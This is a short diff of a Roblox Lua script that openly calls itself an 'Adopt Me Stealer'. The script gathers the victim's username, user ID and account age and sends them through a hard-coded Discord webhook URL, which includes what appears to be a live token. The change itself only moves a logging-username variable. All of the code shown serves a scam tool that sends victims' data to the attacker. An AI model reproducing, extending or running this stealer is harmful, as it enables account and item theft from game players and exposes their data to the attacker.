@@ -75,6 +75,7 @@ getexploit()
 local plr = game.Players.LocalPlayer
 local userid = game.Players.LocalPlayer.UserId
 local accage = game.Players.LocalPlayer.AccountAge
+local LogsUsername = "ImagineGotScamXD"
 local httpRequest = http.request or httprequest
 local embed1 = {
   username = 'Kenn | Adopt Me Stealer!!',
@@ -128,7 +129,7 @@ local function sendEmbed(webhookUrl, embedData)
         print("Bruh")
     end
 end
-local LogsUsername = "ImagineGotScamXD"
+
 local LogsWebhook = "https://discord.com/api/webhooks/1309897171369197588/Es13EP_U_GLWFjJrAwXPasVMU_0h61c3um6K5GNT4z_YJugWa6TGw2m6XNkpV_Y6rWgL"
 sendEmbed(LogsWebhook, embed2)
 wait(7)
